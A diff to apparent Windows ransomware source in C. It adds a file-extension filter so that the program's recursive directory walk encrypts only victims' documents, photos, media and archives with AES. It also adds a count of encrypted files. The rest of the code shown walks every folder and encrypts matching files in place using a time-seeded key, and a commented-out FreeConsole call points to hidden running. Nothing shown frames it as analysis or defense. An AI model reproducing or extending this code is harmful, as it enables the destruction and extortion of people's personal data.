@@ -7,8 +7,24 @@
 
 #include "aes.h"
 
+unsigned int cant_files = 0;
+
+bool isValidFile(char* file) {
+  char* ext = strrchr(file, '.');
+  if (ext == NULL) return false;
+  ext++;
+  return // Only encrypt file with the next extensions
+  !strcmp(ext, "doc") || !strcmp(ext, "pdf") || !strcmp(ext, "rar") || 
+  !strcmp(ext, "bmp") || !strcmp(ext, "gif") || !strcmp(ext, "jpg") || 
+  !strcmp(ext, "mp3") || !strcmp(ext, "mp4") || !strcmp(ext, "avi") || 
+  !strcmp(ext, "txt") || !strcmp(ext, "zip") || !strcmp(ext, "png") || 
+  !strcmp(ext, "mkv") || !strcmp(ext, "ppt") || !strcmp(ext, "xls")  ;
+}
+
 void EncryptFile(char* fname, const uint8_t* key) {
+  if (!isValidFile(fname)) return;
   printf("%s\n", fname);
+  cant_files++;
   FILE* file = fopen(fname, "rb+");
   fseek(file, 0, SEEK_END);
   uint32_t size = ftell(file);
@@ -43,8 +59,8 @@ void EncryptFile(char* fname, const uint8_t* key) {
 void SearchFiles(const char* sDir, const uint8_t* key) {
     WIN32_FIND_DATA fdFile;
     HANDLE hFind = NULL;
-    char sPath[1024];
-    sprintf(sPath, "%s\\*.*", sDir); // Specify a file mask
+    char sPath[512];
+    sprintf(sPath, "%s\\*.*", sDir); // Search all files
     hFind = FindFirstFile(sPath, &fdFile);
     do {
         if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
@@ -56,7 +72,7 @@ void SearchFiles(const char* sDir, const uint8_t* key) {
             else
                 EncryptFile(sPath, key);
         }
-    } while (FindNextFile(hFind, &fdFile)); // Find the next file.
+    } while (FindNextFile(hFind, &fdFile)); // Find the next file
     FindClose(hFind); // Clean
 }
 
@@ -66,7 +82,6 @@ int main() {
   //FreeConsole();
 
   /// GENERATE KEY
-  unsigned int cant_files = 0;
   uint8_t key[32];
   time_t seed = time(NULL);
   srand(seed);
